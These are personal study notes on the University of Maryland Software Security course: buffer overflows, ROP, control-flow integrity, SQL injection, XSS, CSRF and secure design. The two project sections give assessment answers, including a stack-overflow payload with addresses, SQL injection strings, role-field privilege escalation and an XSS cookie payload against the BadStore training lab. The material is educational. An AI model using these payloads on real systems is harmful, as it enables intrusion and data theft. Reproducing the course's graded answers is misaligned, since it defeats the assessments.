# Software Security #

Software Security, by the University of Maryland, College Park, is a class
taught by Michael Hicks. The main goal of the course is to introduce the learner
to software security and discusses common security vulnerabilities found in
software, including:

* Buffer overruns in non-type safe languages like C and C++.
* Web security vulnerabilities
  * SQL injection.
  * Cross-site scripting.
  * Session hijacking

This class also enforces security programming fundamentals.

* How to design a secure system using secure defaults.
* Don't roll your own cryptography. (Yes, it happens).

The class wraps up with a discussion of penetration (pen) testing and using
static analysis tools that help find security vulnerabilities by brute force. 


## Principles ##

* Validate your input! Do not trust input coming in - even from your own system.
* Build security into every aspect of the development cycle.

> Importantly, we take a "build security in" mentality, considering techniques
> at each phase of the development cycle that can be used to strengthen the
> security of software systems.

* Use a type safe language.
* Favor simplicity. Less is more.
* Use the principle of least privilege. Don't run everything as root, for example.
* Use static analysis and automated testing tools (symbolic execution) to help
  find bugs. Code must be well factored for them to be beneficial. Running into
  multiple analyzer warnings points to code smell.

## Week 0 : Introducing Software Security ##

### Video 1 : What is computer security ###

* Engineers code to what a computer *should* do. They focus on **correctness**.

* Security is about preventing a computer from doing something it should *not* do.

Types of attacks:

* Confidentiality (stealing information)
* Integrity (modifying a system, installing spyware, etc)
* Availability (bringing a machine down)

Bug vs. Flaw:
* Flaw - design defect.
* Bug - implementation defect.


### Video 2 : What is software security? ###

* Focuses on code defects. Very different than prevention tricks - firewalls,
  anti-virus.

* Operating System Security : restricting the actions of users (file
  permissions, network port permissions, etc).

  * Limitations of OS security : permissions can be fine grained (DMBS). The OS
    can't deal with this level of granularity. OS security doesn't deal with
    restricting application behavior, watching usage patterns.

* Firewall and Intrusion Detection Systems (IDS)

  * These are "black box" security tricks. Black box security tries to prevent
    or detect access to the problem.

  * Firewalls restrict ports. They can limit the attack surface but not the
    traffic running over the ports.

  * IDS examine traffics running over ports. This is finer grained

  * Anti-virus. Similar to IDS, but examine files. They can be bypassed by
    making small file changes.

* Heartbleed : buffer overflow in SSL. This could *not* have been caught by a firewall or IDS.

* Ultimately, "black box" security tricks do *not* solve bugs, they simply
  attempt to prevent or detect system access or usage. This software can help
  limit attacks, but they cannot prevent attacks. **In order to prevent attacks, you need to fix the software bugs.**

### Video 3 : Course Overview ###

#### Part 1 : Memory Based Security ####
* Focus on writing secure software. C, pointers, stack/heap, x86, web.

* Black hat - How to exploit.
* White hat - How to prevent.

If so many vulnerabilities are memory safety issues, don't use a type safe
programming language (which they recommend).

> The easiest way to avoid these (memory safety) vulerabilities is to use a
> type-safe (memory-safe) programming language.

Key idea : **validate untrusted input**.

#### Part 2 : Web ####

* SQL Injection, XSS, CSRF, session hijacking.

#### Part 3 : Secure Software Development ####

Design:

* SDLC w/ security focus. Identify security requirements (confidentiality,
  integrity, availability).

* Risk analysis / threat modeling.
* Testing : reviews, penetration testing.

* Favor simplity
* Trust with reluctance.
* Defend in depth.

Rules / Tools:

* Coding rules to implement a secure design.
* Static analysis.
* Symbolic execution (whitebox fuzz testing). Fuzz testing attempts to input massive amounts of random data (fuzz) into a system to crash it.
* Penetration (PEN) testing.




## Week 1 : Low-Level Security (C and buffer overflow) ##

### Video 1 : What is a buffer overflow?

Buffer overflows are only found in C/C++ (or any other pointer based language). Use a type safe language to avoid buffer overflows.

What we need is a cross-platform language that is not pointer based (go).

Examples of buffer overflows:
* Robert Morris (worm) - fingerd vulnerability.
* Microsoft IIS (CodeRed) and SQL Server (SQL Slammer).

How to produce a buffer overflow?
* Compiler
* OS
* Architecture.

The term "buffer overflow" could mean any of the following memory based access violations:

* Iteration - running off the end of the buffer.
* Direct access - invalid memory accessed by pointer arithmetic.
* Out of bounds access - addresses that precede or follow the buffer.

Other buffer overflow terms:
* Buffer Underflow : write prior to the start.
* Buffer Overread - read past the end.
* Out of bounds access - preceeding / following the buffer.

### Video 2 : Memory Layout ###

The process feels it owns the entire memory space. A process' address space is virtual. The OS maps the actual memory to physical locations.

<pre>
4GB 0xffffffff
   cmdline & env - set when process starts
   Stack - set at runtime

   Heap - set at runtime (heap grows up from 0x0)
   Uninit'd Data (static int x) -- global vars not initialized are set to 0. Not true of uninit'd local vars) - known at compile time
   Data (init'd data static const int y = 10;) - known at compile time
   Text (code - x86 instructions) - known at compile time
0   0x00000000
</pre>

<pre>
Stack Frame - (loc1 and loc2 are local variables)
           | - current frame pointer.
  loc2 loc1 %ebp %eip arg1 arg2 arg2 %ebp (from main)
            |
            %ebp previous frame pointer - the compiler resores the previous frame pointer on exit.

            %eip - the address to return to on exit.
</pre>


* All function calls and arguments are put onto the stack. For heap based data structures, the pointer is put onto the stack.

Local variables are found based on the relative address on the stack.
* Each function call adds a stack frame.
* A stack frame contains:
  * Calling arguments.
  * Local variables.
  * Frame pointer - (%ebp) marker address the compiler uses to locate local vars.
  * Return address. The memory address to return to when the frame ends.


### Video 3 : Buffer Overflows ###

What is a buffer?
  * A contiguous memory block associated with a variable or field.
  * Overflow - put more into the buffer than it can hold.

Most compilers assume programs don't contain overflows. The compiler *could* prevent buffer overflows by adding out of bounds access to compiled code. C compilers to not.

SEGFAULT : invalid memory access.

* Main point : always check all inputs! Strings, environment variables, packets, file input, etc.

### Video 4 : Code Injection ###

How can code get loaded to memory?

1. Load your program (shellcode) into memory.
2. Get %eip to point to your code (to run it!).

The inserted code must be assembly language. It must be all non-zero bytes. Most C libs will will stop copying on 0. We need *all* our data to be copied - thus it cannot have a 0 byte.



What code do we want to run?
* Shell code! A script that simply runs a process.

How to get the instruction pointer to point to your loaded code? (You don't know where your code is in memory).
  * Manipulate the stack's return address to point to our loaded code.

Finding the return address - how does the attacker find the return address?

* If they have the code, they know how far the buffer is from the saved %ebp (frame pointer).
* If they don't have the code, trial and error.
* Without address randomization, the stack will always start from a fixed address. This reduces the search base.
* nop sleds. Inserts a number of noops, which will advance you to the previous address, which is used to increase the chance you'll land on the address of the malicious code.

### Video 5 : Other Memory Exploits ###

Stack Smashing (Aleph One) - 1996 "Smashing the stack for fun and profit". This is an *integrity* violation.


Heap Overflow:

* Structs are put on the heap. Struct vars can be overflowed.
* C++ vtable - a vtable could be corrupted by overflow a variable on the class.
* Overflow adjacent objects.
* Overflow heap metadata (hidden malloc header).


Integer Overflow:

Takes advantage of the fact that when an integer is populated with a value outside the size of the integer, the value will wrap around.


Corrupting Data:

Attackers modify a secret key in memory or state variables (authenticated flags).


Read Overflow:

Manipulating a read function to read unwanted memory back to the attacker.

Heartbleed was a read overflow. A client sent an echo to the server w/ a length it wanted to echo back. The server could be told to return extra memory.


Stale Memory :

Takes advantage of code that uses a pointer after it was freed (software bug). The attacker induces the system to reallocate the "freed" memory pointed to by the dangling pointer to do what they want. When the dangling pointer is used, the attacker's code is executed.


### Video 6 : Format String Vulnerabilities ###

Uses *printf* and other C functions that use format strings.

<pre>
printf("%s", buf); // good!
printf(buf); // bad! attacker controls the format string!
</pre>

The problem here is that print will read from the stack frame regardless if the

printf(100% dave"); prints "%d" with the stack entry 4 bytes above saved %eip.

printf("%s"); // prints bytes *pointed to* by that stack entry (until it )

printf("100% no way!"); prints the number 3 (%n) to the address pointed to by the stack. This allows the attacker to do a remote code injection.

The bottom line here : when writing bytes, we *must* define the format string and make sure the arguments being supplied to printf() and friends are validated before they are allowed to be used in the format string.

The stack is a buffer. printf() allow you to read / write to/from the stack, therefore format string attacks are buffer overflows.

When programming in C, the attacker still has the ueer hand. It's becoming harder to exploit code, and there are new techniquest being developed to prevent memory exploits. **Still, why are we using C and C++**?

**Always hardcode the format string! Never let it come from user input.**

### Reading : Common Vulnerabilities Guide for C Programmers ###


Big Endian : most significiant byte in the smallest memory address

Value to store in memory : 90AB12CD

Address  Value
1000     90
1001     AB
1002     12
1003     CD

Little Endian : least significant byte in the smallest memory address

Address  Value
1000     CD
1001     12
1002     AB
1003     90

To remember:

* little : least significant, smallest address
* big    : most significant, smallest address


## Project 1 ##

* There is a stack-based overflow in the program. What is the name of the stack-allocated variable that contains the overflowed buffer?
  * wis

* Consider the buffer you just identified: Running what line of code will overflow the buffer? (We want the line number, not the code itself.)
  * 62

* There is another vulnerability, not dependent at all on the first, involving a non-stack-allocated buffer that can be indexed outside its bounds (which, broadly construed, is a kind of buffer overflow). What variable contains this buffer?
  * ptrs

* Consider the buffer you just identified: Running what line of code overflows the buffer? (We want the number here, not the code itself.)
 * 101

* What is the address of buf (the local variable in the main function)? Enter the answer in either hexadecimal format (a 0x followed by 8 "digits" 0-9 or a-f, like 0xbfff0014) or decimal format. Note here that we want the address of buf, not its contents.
  * 0xbffff130

* What is the address of ptrs (the global variable) ? As with the previous question, use hex or decimal format.
  * 0x804a0d4

* What is the address of write_secret (the function) ? Use hex or decimal.What is the address of write_secret (the function) ? Use hex or decimal.
  * 0x8048534

* What is the address of p (the local variable in the main function) ? Use hex, or decimal format.
  * 0xbffff534

* What input do you provide to the program so that ptrs[s] reads (and then tries to execute) the contents of local variable p instead of a function pointer stored in the buffer pointed to by ptrs? You can determine the answer by performing a little arithmetic on the addresses you have already gathered above -- be careful that you take into account the size of a pointer when doing pointer arithmetic. If successful, you will end up executing the pat_on_back function. Enter your answer as an unsigned integer.
  * 771675416

* What do you enter so that ptrs[s] reads (and then tries to execute) starting from the 65th byte in buf, i.e., the location at buf[64]? Enter your answer as an unsigned integer.
  * 771675175

* What do you replace \xEE\xEE\xEE\xEE with in the following input to the program (which due to the overflow will be filling in the 65th-68th bytes of buf) so that the ptrs[s] operation executes the write_secret function, thus dumping the secret? (Hint: Be sure to take endianness into account.) 771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xEE\xEE\xEE\xEE
  * \x34\x85\x04\x08
  * 771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08

* Suppose you wanted to overflow the wis variable to perform a stack smashing attack. You could do this by entering 2 to call put_wisdom, and then enter enough bytes to overwrite the return address of that function, replacing it with the address of write_secret. How many bytes do you need to enter prior to the address of write_secret?
  * 148
    * 128 (wis)
    * 4 wis pointer
    * 4 r pointer
    * 4 WisdomList pointer (l)
    * 4 WisdomList pointer (v)
    * 4 ebp


    The following == 64 bytes

    771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


    // FINAL
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\x78\xf0\xff\xbf\x30\xf1\xff\xbf\x00\x00\x00\x00
    \x30\xf5\xff\xbf\x48\xf5\xff\xbf\x34\x85\x04\x08


    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x78\xf0\xff\xbf\x30\xf1\xff\xbf\x00\x00\x00\x00\x30\xf5\xff\xbf\x48\xf5\xff\xbf\x34\x85\x04\x08





    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff
    128

    \x78\xf0\xff\xbf
    132
    \x30\xf1\xff\xbf
    136
    \x00\x00\x00\x00
    140
    \x30\xf5\xff\xbf
    144
    \x48\xf5\xff\xbf
    148
    \x34\x85\x04\x08
    152







    \x78\xf0\xff\xbf
    0xbffff078

    \x30\xf1\xff\xbf
    0xbffff130

    \x00\x00\x00\x00
    0x00000000

    \x30\xf5\xff\xbf
    0xbffff530

    \x48\xf5\xff\xbf
    0xbffff548

    ORIGINAL:
    0x0804880d

    WRITE_SECRET:
    \x34\x85\x04\x08


## Week 2 : Defense Against Low Level Attacks ##

### Video 1 : Defenses against low-level attacks ###

* Automatic defenses against memory based attacks - ASLR / stack canaries.
* ASLR and stack canaries can be defeated:
  * ROP : return oriented programming ()
  * CFI : control flow integrity.

**Nothing is completely secure. If you are going to write in C, you need to code safe**

Memory safe program
* Only creates pointers via malloc or & (b = &p)

### Video 2 : Memory Safety ###

1. Only creates "valid pointers" - created by malloc() or & operator, or pointer arithmetic (temporal safety).
2. Pointers do not access memory that does not belong to the variable (spacial safety).

There are two categories of memory safety:
  * Spacial safety - a pointer only addresses memory allocated to it.
  * Temporal safety - pointers are only used when they are properly initialized and "alive".

Spacial safety

* Spacial safety requires all variables only access the memory allocated to them.
* Buffer overflows violate spacial safety.

* A pointer should only access memory which the pointer owns.
  (p, b, e)
  p == pointer
  b == base
  e == extent
  Access allowed iff b <= p <= e-sizeof(typeof(p))

Temporal Safety

* Temporal safety refers to accessing undefined or freed memory.
* Using dangling pointers violate temporal safety.
* Accessing uninitialized pointers also violates temporal safety.

Most languages are memory safe:
* Java / python
* Go, Rust, Swift

* You get a bug boost to security by using a modern language.
* C/C++ is here to stay (boo).

* Can we compile C/C++ to be memory safe?
* Compiler could check for violations. (ArrayOutOfBounds in java)
  * Slow!
  * CCured : 1.5 slowdown (not bad). No checking libraries, however.
  * Softbound / CETS - 2.1x slowdown - complete checking.
  * Intel MPX : hardware support to make checking faster.


### Video 3 : Type Safety ###

* What is type safety?
  * Objects are ascribed a type. Operations are always compatible with the type. i.e., you can't overrun a buffer.
  * Dynamically typed languages are type safe. All objects are "Dynamic", at runtime, the runtime determines if each operation is allowed during runtime.
  * Type safety allows encapsulation - implementations behind an interface can change without changing the type.

JIF : java with information flow - rules for determining how the data can flow:
* int {Alice->Bob} x; // Alice owns this, can give it to bob (more strict)
* int {Alice->Bob, Chuck} y; // Alice or Chuck own this (less strict)

Why not type safety?
* Memory and performance overhead costs.
* Rust, Go, Swift all aim for the benefits of type safety with C like performance and memory characteristics.


### Video 4 : Avoiding Exploitation ###

* Make bugs harder to exploit (mitigating).
* Avoid the bug entirely (preventing) (secure coding practices, yes!).
  * Will require use of special tools (fuzzing, program analysis).

Avoiding Exploitation

Challenges:

1. We don't want to allow attackers to put code on the stack.
  * Defense : stack canaries.
  * Detecting overflows (stack canaries).
    * A "canary" number is added on the stack.
    * If the attacker overruns a buffer, it overruns the canary. The compiler emits instructions to verify the canary and exit the program if changed.
      * Terminator canaries (0, NULL, to prevent string functions)
      * Random (most common approach)- random value write protected in memory and used as canary on each stack frame.
      * XOR - mask based on a known value (return address) - each frame has a different canary.

You *could* prevent all heap based memory from being executed, thus you couldn't run the attacker's shellcode (which they loaded into memory). This defense would work, however attackers could point to known locations in libc (in the data portion of memory) that perform the same actions as shellcode. The attacker points to a location in libc that they want to execute (exec() or printf()).

2. Getting %eip to point to attacker code.
  * Defense : make stack (and heap) non-executable.
  * ASLR : random memory layout randomization - makes return addresses harder to know. Randomizes where libc functions are stored in memory so the attacker can't "return to libc" from the stack at a fixed memory location.
    The stack has also been randomized, so the attacker doesn't know where the return pointer is.
    * ASLR : Linux in 2004, BSD 2006, Win 2007, Mac 2007 / 2011, Android 2012, iOS 2011
    * ASLR may *not* apply to program code. Depends on how you compiled it.

    * ASLR is acceptable to brute force attacks.

### Video 5 : Return Oriented Programming (ROP) ###

* Making the stack non-executable doesn't work - attackers can brute force find the libc functions they want to call.
* You could *not* include libc, however attackers can still find pieces of existing code to construct an attack.

What is return oriented programming?
* String together pieces of existing code.
* Find the "gadgets" you need in the program code and chain them together with returns. You are cutting and stringing together gadgets to construct an atatck.

ROP is the process of manipulating the stack to point to gadgets which do what the attacker wants.

How to find gadgets?
* Disassemble the binary, looking for return instructions and look backwards, looking for instructions we want.
* Are their sufficient gadgets to do anything interesting?
  * Yes! Gadgets can be found within libc.
    * x86 is dense. You can find whatever you need to to do whatever you want.
  * Gadget shellcode has been automated. (Schwartz)

What about ASLR and 64 bit?
  * How to defeat ALSR (how do we know where the gadgets will be?):
    * Use Blind ROP
      * If a server restarts on a crash, but does not re-randomize:
        * Read the stack to leak canaries and a return address.
        * Find gadgets at runtime to call to write.
        * Dump binary via write.
        * Blind ROP could remotely exploit ngnix (w/ full stack canaries and ASLR).

  * Could you simply re-randomized on each restart?

How to defect memory safety issues? **USE A MEMORY SAFE LANGUAGE**


### Video 6 : Control Flow Integrity ###

CFI prevents stack smashing by only allowing the program to jump and return to functions that we expect. This prevents jumping to a non-known address (attacker code or ROP).

CFI gives each indirect function a label. Instructions are added to the program via the compiler that will compare labels before jumps to ensure we are jumping to the correct function.


Control flow integrity:

* Could we identify at runtime when a program has been compromised?
  * We have to know what the program "should be doing" in order to determine if it has been corrupted.

1. Define "expected behavior" (Control Flow Graph (CFG)).
2. Detect deviations from expectations
  * In-line reference monitor.
3. Avoid compromise of the detector.
  * Randomness, immutability of code.

* CFI = 16% overhead, 45% in worst case. Can't handle libs - bad!
* Modular CFI : handles modules. 5%/12% overhead. C programs only (LLVM).
* Is CFI secure? Yes!
  * MCFI can prevent 95% of ROP gadgets.

* By creating a call graph, we can determine when a program is not running correctly.
* CFI == Compliance with CFG. The CFG is computed in advance, or at runtime from the binary.
* CFI will monitor jump, call, ret and make sure it's conforming to the CFG.
  * CFI doesn't need to monitor calls that are known to fixed address functions - CFI monitors only function calls that are not

* In-line monitor
  * Insert a label before the target address at a transfer. If the label is not one we expect, then abort.

* Can we defect CFI?
  * Inject code that has a legal label. Won't work - we assume non-executable data!
  * Modify code labels - won't work because the code is immutable!
  * Modify stack during a check to make it seem like it succeeded.
    * Won't work because the attacker can't modify the registers.

* CFI does not prevent data leaks (heartbleed) - CFI only concerns itself with flow between functions.
* CFI *does* prevent against all code injection attacks.

* CFI is still a bit slow and not widely used. It's coming, which will help


### Video 7 : Secure Coding ###

Automated measures cannot prevent attacks. You must write secure code!

* CERT C coding standards - reference guide for secure programming.
* Advanced code review and testing mechanisms
  * Static program analysis, fuzz testing.

* Use secure principles and rules.
  * Principle of least priviledge.


* Rules for C programming.
  * Enforce input compliance:
    * Check length boundaries, etc.
    * Principle : robust coding. Don't trust any input. Check all preconditions on outside callers.
  * Use safe string functions
    * Don't assume buffers have sufficient length!
    * strlcat, strlcpy, etc.
    * Don't forget the null terminator - string functions will add the null terminator.
  * Understand pointer arithmetic.
    * sizeof returns the number of bytes.
    * pointer arithmetic will multiply by the size of the type!
  * Defend against dangling pointers.
    * NULL out pointers after free. Anyone who tries to deference the pointer will crash (good).
    * Use goto chains to avoid duplicate or missed code. (similar to try / finally).
    * Make sure you confirm your logic (gotofail bug).
  * Use safe string library
    * VSFTP string library or std::string.
  * Favor safe libraries
    * Smart pointers
    * Google protocol buffers (input validation / parsing is correct)
  * Use a safe allocator
    * A randomizing malloc implementation makes it harder to exploit.
      * Windows fault-tolerant heap
      * Die hard

Reading : What is memory safety?
  * (b, p, e)

Reading : What is type safety?
  * The language prevents invalid uses of data. For example, an array cannot be indexed out of bounds. Integers annot be added to strings.
  * Information hiding (interfaces / implementations).
  * Type systems could be used to prevent race conditions (i.e., adding java annotations).


## Week 3 : Web Security ##

### Video 1 : Security for the Web : Introduction ###

Outline
* SQL Injection
* XSS : Cross-site scripting
  * User is tricked into running code from a non-trusted website.
* CSRF : Cross site request forgery
* Session Hijacking

Ephemeral state : hidden form fields and cookies (which lead to session hijacking and CSRF)

**Best Defense: Validate your input**

### Video 2 : Web Basics ###

* Introduction to URLs **protocol://host:port/path?qs**
* Static vs. dynamic content (html vs php)
* GET vs. POST (typically includes body data)

* Look into HTTP headers for analytics purposes. i.e., referrer, Cache-Control

* Response
  * Status code
  * Headers (Content-Type, Set-Cookie, etc)
  * Data
  * Cookies

### Video 3 : SQL Injection ###

SQL Transactions should be ACID:

* Atomicity - transactions complete entirely or not at all.
* Consistency - The DB is always in a valid state (even w/ concurrent users)
* Isolation - Results aren't visible until the Tx is complete.
* Durability - Once a Tx is comitted, it's effects should persist (despite power failures, etc)

* Uses PHP w/ SQL via string concatenation. Uhh.

* SELECT * FROM users WHERE (name = '%s');
  * %s == "frank' OR 1=1); --"
* SELECT * FROM users WHERE (name = 'frank' OR 1=1);

### Video 4 : SQL Injection Countermeasures ###

* When the boundary between code / data blur we are ripe for attack.
  * If you can manipulate the SQL parse tree by entering data, you have a security leak.

* Sanitization

  * Black listing - removes input matching the blacklist. This won't work for SQL since some typically blacklisted characters could be used as valid input.
  * Escaping - using libraries for escaping. Escaping them may not be enough.
  * White listing - only allow approved input.
    * Hard to determine what the whitelist should be, how it should be maintained.

* How to mitigate SQL injection:
  * Use prepared statements. These separate data from code. The data can't change the parse tree.
  * Limit privileges : the DB connection should use the principle of least privilege.
  * Encrypt data in DB - if the DB becomes corrupted, it's not valuable.

### Video 5 : Web Based State using hidden form fields and cookies ###

* HTTP is stateless - how do we create a long running session?
* ephemeral (session) state is stored on the client via cookies or hidden fields.
* The server should maintain the trusted state via a session id.
* Cookies are small bits of state sent w/ HTTP headers back and forth.

Set-Cookie: edition=us;expires=Wed, 18-Feb-2015;path=/;domain=damonallison.com

* Why cookies?
  * Session identifier
  * Personalization
  * Tracking users:
    * Ad networks use the referrer URL to keep track of sites you visit.
    * They store the list in a 3rd party cookie.
    * They use the cookie to determine what to show you.
    * Disabling 3rd party cookies can be disabled, however this can be worked around by fingerprinting your browser instance.

### Video 6 : Session Hijacking ###

* User logs into a site, receives a session cookie.
* The attacker can steal the cookie by:
  * Predicted - if the server uses a particular algorithm to create session ids.
    * Cookie generation should be random and long.
  * Sniffing the network.
    * Always use HTTPS.
    * Use the "secure" attribute on a cookie to require it to send over https only.
  * The server using a well known algorithm to generate session ids.

* Only allow requests to a page to come from expected referrers.
  * Example: Assume the user is viewing a bank balance. If the next request comes in to request a transfer, it's not valid.

* Always time out session ids. SessionIds should always expire.
* Delete the session ids when the browser session ends.
* Do *not* tie cookies or sessions to an IP address - IP addresses change (mobile) or NAT'd.

### Video 7 : Cross-Site Request Forgery (CSRF) ###

A user is tricked into clicking a link in a spam email (phishing attack). The attacker website tells the browser to GET a page from a valid website (wellsfargo.com). When the browser executes the link, it includes the cookies for the valid website's domain. The website then performs the attacker's action using the browser's cookies (sessionId) for the valid website's domain.

* CSRF :
  * 0. The user has a sessionId with a valuable site (bank).
  * 1. The user clicks on a fraudulent link to be served up by an attacker's website.
  * 2. An attacker website serves up a URL to the valuable domain that the user is logged into. For example, as an <img src="http://wellsfargo.com/transfer/" />
  * 3. The user's browser will GET the URL and perform the action the attacker requested, using the user's valid sessionId.

* How to protect against CSRF?
  * Pay attention to the Referrer HTTP header. (Can the attacker control the Referrer URL?)
  * Referrer is optional!
    * Is a missing Referrer harmless?
      * No. Attackers could force the removal of the referrer (by directing them to ftp:// url.
  * Embed a secret in a page (as a hidden form field). The attacker doesn't know the sessionId, the hidden form field could be the sessionId.
    * Framework support : RoR embeds secret in every link it generates.

### Video 8 : Web 2.0 ###

* Javascript runs client-side - possible attack vector. JS can  
  * Alter DOM.
  * Track events (keystrokes).
  * Send data (HTTP requests / response).
  * Read / set cookies.

* The browser must protect user data.
  * Same origin policy (SOP).
  * All web page elements have an origin (host).
  * Each page can only access data for it's origin.

### Video 9 : Cross-Site Scripting (XSS) ###

XSS Works around the same origin policy.

Tricks the browser into believing it is part of a different origin.

1. Stored (or "persistent") XSS attack.
  * The attacker stores a bad script on the good web server.
  * User requests page and retrieves / runs the attacker's JS.
  * How does the user store a bad JS onto a good web server?
    * If the good web server doesn't validate it's input, bad JS could be entered and stored on the good web server.

2. Reflected XSS (server accepts JS, echoes it back to the user)
  * Attacker gets you to send bank.com a URL that includes JS code.
  * bank.com echoes the script back to you in it's response.
  * The local browser executes the script in the same origin as bank.com (and your sessionId, etc, is sent to the attacker).
  * The trick is the good web server must accept JS and echo it back to the user (i.e., search results).

**VALIDATE THE INPUT**

* Sanitization : the server should remove *all* executable portions of user input.
* A website should be able to accept `<script>` and other user input (comments, etc), but the input **must not be executed** by the browser.
* Watch all resources! It's possible to embed JS into CSS and XML encoded data. Pay attention!
* White listing is a better defense.
  * It forces all input to be a known-good subset.
    * The problem here : what if we want to allow `<script>` in user-entered comments? i.e., for a programming blog? What does the whitelist look like?

* Input validation :
  * All input (even YAML!) can be used to execute code.
  * Java serialization : if objects are deserialized, it may execute code!
  * Whitelisting is preferred to blacklisting.

### Supplemental Video : Interview w/ Symantic Researcher Kevin Haley ###

* Symantic "big brothers" a machine - watches all activity on a user's computer.
* Vast majority of malware is criminal / nation state for cyber espionage.
* Scope of security threat growing?
  * Yes - 1million pieces of malware every day.
  * Our move to the virtual world brings attackers to the virtual world as well.
  * Hard for law enforcement to track down (across boarders, etc).
* Trends in root causes of vulnerabilities:
  * Underground toolkits to create exploits for non-technical users.
  * The toolkits are frequently updated.
* How does anti-virus work?
  * Pattern matching technology. Fingerprints a system.
  * Symantec's AV deals with variants.
  * "Endpoint protection". They are using system detection to determine if a system is misbehaving.
  * They use machine learning and use data across the machines to detect new patterns that have not been identified by symantec yet.
* What advice does Symantec have to how we can do a better job to build security in? How could we build software better?
  * Recognize what your software is doing. Assume it can be misused.
  * Don't make security an afterthought. (Startups do this).
  * Hire people to PEN test your system.
* Undergraduate education. Security gets left out of curriculum. What's your view about what kids should be learning?
  * Bake security into the process, curriculum, and products.
* What is the future outlook for computer security?
  * Crime will evolve, improve techniques.
  * Countries are adding security offences and defences.
  * Systems are becoming more complex. Complexity favors attackers.
  * IoT is a new attack vector.


## Project 2 : BadStore Project ##

* One of the BadStore pages has a hidden form field that establishes a new user's privilege level. What is the name of this field?
  * role (found on the login page)

* How many items for purchase are in BadStore's database? Use SQL injection on the quick search form field to find out.
  * Search for "TEST' OR 1=1 OR 'test"
  * 16

* What operations are suppliers permitted to do once they have logged into the "suppliers only" area? Use SQL injection to bypass authentication, or find a way to create an account as a supplier.
  * To exploit this, create a new account. After the account is created, edit the post data to create another user, this time with role="S".
    * admin2@test.com : asdfasdf
  * Upload price lists
  * View pricing file.

* Log in as joe@supplier.com--- this is possible in a variety of ways, including SQL injection. Then look at his previous orders and answer the question: What credit card number did he use to make a purchase of $46.95? Multiple answers are possible, but we will accept all of them.
  * From the "My Account" page, reset joe@supplier.com password, which it prints on the screen == "Welcome".
  * 4111 1111 1111 1111

* Get administrator privileges and then use the admin action to look at the user database. There are two users whose emails have the form XXX@whole.biz; what is the XXX portion of either of the two users? For example, if one of the users is jackie@whole.biz, the right answer is jackie. (The answer is case-sensitive.)
  * Create an account with the role="A" (admin2@test.com : asdfasdf)
  * Login with that user. The main screen will show {unregistered user}.
  * Enter the admin portal using action=admin

  * landon
  * fred

* BadStore uses cookies to implement a session key, once you've authenticated, and for tracking the contents of the cart, once you've added something to it. You can figure out the cookies in use by BadStore in various ways. One way is to do an XSS attack on the guest book. Get the guest book to run the code <script>alert(document.cookie)</script> and it will tell you the current cookies. (Be sure you have popups enabled on your browser or this won't work.) Alternatively, you can examine the cookies directly using Firefox developer tools. Recall that cookies are pairs key=value. What is the key of the session cookie?
  * SSOid

* BadStore uses cookies to track the contents of the cart, once you’ve added something to it. What is the key name of the cookie used for the cart?
  * CartID

* BadStore's session cookie format is poorly designed because it is uses a predictable structure. In particular, it is an encoded string (with a URL-encoded newline at the end) of the form XXX:YYY:ZZZ:U. What are the XXX, YYY, and ZZZ portions of this string?
  * XXX : email address
  * YYY : password MD5
  * ZZZ : full name

* BadStore's cart cookie is also an encoded string with a predictable structure XXX:YYY:... etc., and it probably contains information it shouldn't. Which field of the decoded string could an attacker change to give himself a discount on an item's price?
  * Field 3 (Price)


## Week 4 : Building Secure Software ##

### Video 1 : Designing and Building Secure Software : Introduction

* Build in security minded thinking from the start (and throughout).
* Development process phases:
  * Requirements
    * Develop "abuse cases"
  * Design
    * Risk analysis
  * Implementation
    * Security-oriented design
    * Code review (automated tools)
  * Testing
    * Risk-based security tests.
    * PEN testing.

* Security features are starting to show up in hardware.
  * AWS-NI (Intel crypto instructions)
  * Physically uncloneable functions (hardware based "uncloneable" functions).

### Video 2 : Threat modeling (Architectural risk analysis)

* Threat model : what powers does an adversary have?
  * DOS ability, fast chips for brute force attacks, etc.
  * Network user :
    * The user can access the system from the network.
